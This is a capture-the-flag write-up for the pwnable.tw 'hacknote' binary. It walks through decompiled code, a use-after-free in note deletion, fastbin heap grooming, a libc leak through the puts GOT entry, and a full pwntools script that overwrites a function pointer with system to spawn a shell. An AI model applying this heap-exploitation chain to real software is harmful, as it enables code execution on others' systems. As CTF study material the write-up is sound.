# hacknote

file:
```
hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped
```

checksec:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes     0               2       hacknote
```

## solution

The program prompts the user to add/delete/print note or exit. these kind of challenges are a classic CTF that usually involves a UAF.

Lets open this up in ghidra. its kinda jank since ghidra decompilation is weird with custom types. as it turns out there is a `notelist[]` of type `note` which has a `addr` pointer and `contents` pointer.


```cpp
void main(void)

{
  int selected_option;
  int in_GS_OFFSET;
  char buf [4];
  undefined4 canary;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  canary = *(undefined4 *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  do {
    while( true ) {
      while( true ) {
        print_ui();
        read(0,buf,4);
        selected_option = atoi(buf);
        if (selected_option != 2) break;
        delete_note();
      }
      if (2 < selected_option) break;
      if (selected_option == 1) {
        add_note();
      }
      else {
LAB_08048a96:
        puts("Invalid choice");
      }
    }
    if (selected_option != 3) {
      if (selected_option == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_08048a96;
    }
    print_note();
  } while( true );
}
```

in `add_note`, weird stuff with `notelist` is indexing an array. it only allows the creation of 6 notes. Also the pointer `notelist[index]->addr` is set. it mallocs a `note` struct and the note contents.


```cpp
void add_note(void)

{
  int iVar1;
  void *_note;
  size_t __size;
  int in_GS_OFFSET;
  int i;
  char buf [8];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  if (global_index < 6) {
    i = 0;
    while (i < 5) {
      if (*(int *)(&notelist + i * 4) == 0) {
        _note = malloc(8);
        *(void **)(&notelist + i * 4) = _note;
        if (*(int *)(&notelist + i * 4) == 0) {
          puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        **(code ***)(&notelist + i * 4) = print_func;
        printf("Note size :");
        read(0,buf,8);
        __size = atoi(buf);
        iVar1 = *(int *)(&notelist + i * 4);
        _note = malloc(__size);
        *(void **)(iVar1 + 4) = _note;
        if (*(int *)(*(int *)(&notelist + i * 4) + 4) == 0) {
          puts("Alloca Error");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        printf("Content :");
        read(0,*(void **)(*(int *)(&notelist + i * 4) + 4),__size);
        puts("Success !");
        global_index = global_index + 1;
        break;
      }
      i = i + 1;
    }
  }
  else {
    puts("Full");
  }
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

the `delete_note` frees the `notelist[index]` and `notelist[index]->contents` pointers, but it does not remove the note from `notelist`, it only frees.


```cpp
void delete_note(void)

{
  int index;
  int in_GS_OFFSET;
  char buf [4];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,buf,4);
  index = atoi(buf);
  if ((index < 0) || (global_index <= index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(int *)(&notelist + index * 4) != 0) {
    free(*(void **)(*(int *)(&notelist + index * 4) + 4));
    free(*(void **)(&notelist + index * 4));
    puts("Success");
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`print_note` calls `notelist[index]->addr` which is set to `print_func`.


```cpp

void print_note(void)

{
  int index;
  int in_GS_OFFSET;
  char buf [4];
  int canary;
  
  canary = *(int *)(in_GS_OFFSET + 0x14);
  printf("Index :");
  read(0,buf,4);
  index = atoi(buf);
  if ((index < 0) || (global_index <= index)) {
    puts("Out of bound!");
                    /* WARNING: Subroutine does not return */
    _exit(0);
  }
  if (*(int *)(&notelist + index * 4) != 0) {
    (***(code ***)(&notelist + index * 4))(*(undefined4 *)(&notelist + index * 4));
  }
  if (canary != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

What we can probably do is overwrite `note->addr` with a call to `system` and then call `print_note` to spawn a shell.

To leak the libc address we need to print the contents of a GOT entry, such as the entry of `puts` in the GOT. To do this we need to use a UAF and overwrite the `note->addr` pointer with the address of the GOT entry for `puts` by overwriting the pointer to the note's struct as that is what is malloc'd.

To do this and utilize the UAF we can:

```
malloc note0: struct 8, contents 8
malloc note1: struct 8, contents 8

free note1, note0

malloc note2: struct 8, contents 32
	note2 struct <-> note0 struct as note0 struct is popped from fastbin
	note2 contents will be in a different bin
malloc note3: struct 8, contents 8
	note3 struct <- note0 contents as that is next to be popped
	note3 contents -> note1 struct, overwrites the pointer
```

this means that we can set the contents of note3 (with add note) to the print function and the address of the puts@got and it will print that when note1 is printed, as the note3 contents pointer is pointing to the same region as the note1 struct pointer.

After this is leaked, we need to set the pointer so we can call system. we can build upon the previous malloc and frees:

```
free note3

malloc note4: struct 8, contents 8
	note4 struct <-> note3 struct <-> note0 contents
	note4 contents <-> note3 contents <-> note1 struct
```

The note4 contents will then be pointed to by the note1 struct pointer, and when print on note1 is called it will spawn a shell using the system address and sh string set as the note4 contents.

solution script:


```py
from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10102)
    else:
        p = elf.process()

context(os="linux")
context.binary = elf = ELF("./hacknote")
context.terminal = '/bin/sh'
libc = ELF('./libc_32.so.6')
start()


libc_system = libc.symbols["system"]
libc_puts = libc.symbols["puts"]

addr_puts_got = elf.got["puts"]
addr_print_func = 0x804862b


def add_note(size, contents):
    p.send(b"1\n")
    p.recvuntil(b"Note size :")
    p.send(str(size))
    p.recvuntil(b"Content :")
    p.send(contents)
    p.recvuntil(b"Success !\n")
    skip_menu()

def delete_note(index):
    p.send(b"2")
    p.recvuntil(b"Index :")
    p.send(str(index))
    p.recvuntil(b"Success")
    skip_menu()

def print_note(index):
    p.send(b"3")
    p.recvuntil(b"Index :")
    p.send(str(index) + "\n")

def skip_menu():
    p.recvuntil(b"----------------------")
    p.recvuntil(b"----------------------")
    p.recvuntil(b"----------------------\n")


# leak the libc base
# malloc note0
add_note(8, b"A"*2)
# malloc note1
add_note(8, b"A"*2)

# free note1
delete_note(1)
# free note0
delete_note(0)

# malloc note2
add_note(32, b"A"*10)

# malloc note3 and overwrites note1 struct
add_note(8, p32(addr_print_func) + p32(addr_puts_got))

# print note1
print_note(1)

leaked_addr = u32(p.recv(4))
libc_base = leaked_addr - libc_puts
system_addr = libc_base + libc_system

log.info(f"leaked libc base: {hex(libc_base)}")

# free note3
delete_note(3)

# malloc note4 to spawn shell
add_note(8, p32(system_addr) + b";sh;")

p.write(b"3")
p.recvuntil(b"Index :")
p.write(b"1")

p.interactive()
```